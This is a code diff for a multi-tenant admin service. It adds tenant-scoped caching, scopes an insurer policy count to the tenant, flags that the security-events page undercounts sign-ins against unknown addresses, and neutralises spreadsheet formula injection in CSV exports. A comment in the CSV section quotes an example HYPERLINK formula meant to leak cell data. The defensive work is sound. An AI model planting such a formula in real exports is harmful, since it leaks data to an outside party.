@@ -9,12 +9,43 @@
  */
 import AppError from "../utils/appError";
 import prisma from "../config/db";
+import cache from "./cache.service";
+import { CACHE_TTL } from "../config/constants";
 import { auditService } from "./audit.service";
 import { branchComparison, enterpriseOverview, resolutionTrend } from "../admin/overview";
 import { assessWorkload } from "../employee/operationsManager";
 import { aiSystemStatuses, workflowActivity, workflowCatalogue } from "../admin/aiSystems";
 import { PERMISSIONS, permissionsForRole } from "../auth/permissions";
 import { complianceFindings, complianceSummary, summariseFindings } from "../admin/compliance";
+
+/**
+ * The cache key for one tenant's copy of one panel.
+ *
+ * Every cached read on this surface goes through here, and it throws rather than
+ * builds a key without an organisation. That is the whole safety argument: a
+ * cache key that silently loses its tenant does not serve a slightly stale
+ * page, it serves *another organisation's* page to whoever asks next — a
+ * critical breach produced by an omission no reviewer would notice. Making the
+ * key impossible to construct without the tenant beats remembering to include
+ * it at four call sites, and beats it again at the fifth one added later.
+ */
+const tenantKey = (panel: string, organizationId: string): string => {
+  if (!organizationId) {
+    throw new AppError("Refusing to cache a tenant panel without an organisation.", 500);
+  }
+  return `enterprise:${panel}:${organizationId}`;
+};
+
+/**
+ * How long a console panel may be stale.
+ *
+ * Short on purpose. These are dashboards, not ledgers — a figure half a minute
+ * behind is the same decision; a figure a quarter-hour behind is a different
+ * one. The audit trail and the security page are deliberately absent from every
+ * cached path below: those are what somebody opens *during* an incident, and
+ * stale is the one thing they must never be.
+ */
+const PANEL_TTL = CACHE_TTL.DEFAULT;
 
 /** Bound every list. An unbounded admin query is a production incident. */
 const MAX_PAGE = 100;
@@ -25,30 +56,38 @@ const clampTake = (value: unknown, fallback = 25): number => {
 };
 
 export const enterpriseAdminService = {
-  /** Everything the dashboard needs, in one call. */
-  async dashboard(organizationId: string) {
-    const [overview, trend, branches, compliance, ai] = await Promise.all([
-      enterpriseOverview(organizationId),
-      resolutionTrend(organizationId, 14),
-      branchComparison(organizationId),
-      complianceSummary(organizationId),
-      aiSystemStatuses(organizationId),
-    ]);
+  /**
+   * Everything the dashboard needs, in one call.
+   *
+   * The most expensive read on the platform — forty-four queries assembling five
+   * panels — and the one every administrator loads first, repeatedly, from a
+   * screen they leave open. Cached per tenant for that reason.
+   */
+  dashboard(organizationId: string) {
+    return cache.wrap(tenantKey("dashboard", organizationId), PANEL_TTL, async () => {
+      const [overview, trend, branches, compliance, ai] = await Promise.all([
+        enterpriseOverview(organizationId),
+        resolutionTrend(organizationId, 14),
+        branchComparison(organizationId),
+        complianceSummary(organizationId),
+        aiSystemStatuses(organizationId),
+      ]);
 
-    return {
-      overview,
-      trend,
-      branches,
-      compliance,
-      // Only the headline for each system; the full picture is its own page.
-      aiSystems: ai.map(({ id, name, health, activity, workload }) => ({
-        id,
-        name,
-        health,
-        activity,
-        workload,
-      })),
-    };
+      return {
+        overview,
+        trend,
+        branches,
+        compliance,
+        // Only the headline for each system; the full picture is its own page.
+        aiSystems: ai.map(({ id, name, health, activity, workload }) => ({
+          id,
+          name,
+          health,
+          activity,
+          workload,
+        })),
+      };
+    });
   },
 
   /**
@@ -332,9 +371,19 @@ export const enterpriseAdminService = {
     const [companies, policies] = await Promise.all([
       // Insurers are shared reference data — "HDFC Ergo" is not owned by a
       // tenant — so the company list is not scoped. The catalogue below is.
+      //
+      // The count on each insurer *must* be, though. A relation count inherits
+      // no scope from the row it hangs off, so an unfiltered one here counted
+      // every tenant's products for that insurer: subtract your own catalogue
+      // and you have a competitor's, watched daily from your own console.
       prisma.company.findMany({
         where: { deletedAt: null },
-        select: { id: true, companyName: true, isActive: true, _count: { select: { policies: true } } },
+        select: {
+          id: true,
+          companyName: true,
+          isActive: true,
+          _count: { select: { policies: { where: { organizationId, deletedAt: null } } } },
+        },
         orderBy: { companyName: "asc" },
         take,
       }),
@@ -923,6 +972,12 @@ export const enterpriseAdminService = {
    * No score and no green badge: nothing in this codebase defines what a
    * "healthy" failure rate is, and inventing a threshold would dress a guess as
    * a measurement.
+   *
+   * And one blind spot, stated in the payload rather than left to be discovered.
+   * A sign-in event belongs to a tenant through the account it was against, so
+   * an attempt on an address matching no account belongs to nobody — which is
+   * exactly the traffic a stuffing run produces before it finds a real address.
+   * Everything below is quieter than the truth by that margin.
    */
   async securityEvents(organizationId: string, query: { take?: unknown }) {
     const take = clampTake(query.take, 50);
@@ -999,6 +1054,15 @@ export const enterpriseAdminService = {
         .slice(0, 10),
       failuresLastDay: failures.length,
       sessions,
+      // The margin by which every figure above is an undercount. Named rather
+      // than hidden: an administrator reading a quiet security page during a
+      // stuffing run is worse off than one who knows what the page cannot see.
+      unattributedFailures: {
+        available: false as const,
+        reason:
+          "A sign-in attempt is attributed to this organisation through the account it was made against. Attempts on addresses matching no account belong to no organisation, so they are absent from the figures above — including attempts on your domain.",
+        needs: "An organisation resolved at sign-in time and written onto the event, rather than inferred from the account afterwards.",
+      },
     };
   },
 
@@ -1015,19 +1079,21 @@ export const enterpriseAdminService = {
    * second await could not start until the first had finished — to answer a
    * question the first run had already answered.
    */
-  compliance: async (organizationId: string) => {
-    const findings = await complianceFindings(organizationId);
-    return { summary: summariseFindings(findings), findings };
-  },
+  compliance: (organizationId: string) =>
+    cache.wrap(tenantKey("compliance", organizationId), PANEL_TTL, async () => {
+      const findings = await complianceFindings(organizationId);
+      return { summary: summariseFindings(findings), findings };
+    }),
   // Three independent reads, so they wait together rather than in turn.
-  analytics: async (organizationId: string) => {
-    const [overview, trend, branches] = await Promise.all([
-      enterpriseOverview(organizationId),
-      resolutionTrend(organizationId, 30),
-      branchComparison(organizationId),
-    ]);
-    return { overview, trend, branches };
-  },
+  analytics: (organizationId: string) =>
+    cache.wrap(tenantKey("analytics", organizationId), PANEL_TTL, async () => {
+      const [overview, trend, branches] = await Promise.all([
+        enterpriseOverview(organizationId),
+        resolutionTrend(organizationId, 30),
+        branchComparison(organizationId),
+      ]);
+      return { overview, trend, branches };
+    }),
 
   /**
    * A report, as rows.
@@ -1095,11 +1161,26 @@ export const enterpriseAdminService = {
  * Every field is quoted and internal quotes are doubled. Unquoted CSV breaks on
  * the first comma in a remedy sentence, and a report that silently loses a
  * column is worse than one that fails to generate.
+ *
+ * Quoting is enough for a CSV *parser* and not enough for a spreadsheet. Excel
+ * and its kin evaluate a cell that opens with a formula character however it was
+ * quoted, so a branch named `=HYPERLINK("https://…"&A1,"Loading…")` becomes a
+ * working exfiltration link the moment an executive opens the branch report.
+ * Reports are the one thing on this surface designed to leave the platform,
+ * which makes this the one place that assumption matters.
  */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
 export function toCsv(rows: Record<string, unknown>[]): string {
   if (rows.length === 0) return "";
   const headers = Object.keys(rows[0] as Record<string, unknown>);
-  const escape = (value: unknown): string => `"${String(value ?? "").replace(/"/g, '""')}"`;
+  const escape = (value: unknown): string => {
+    const text = String(value ?? "");
+    // A leading apostrophe is the convention every major spreadsheet reads as
+    // "this is text" — the value still displays as written.
+    const safe = FORMULA_LEAD.test(text) ? `'${text}` : text;
+    return `"${safe.replace(/"/g, '""')}"`;
+  };
   return [
     headers.map(escape).join(","),
     ...rows.map((row) => headers.map((header) => escape(row[header])).join(",")),
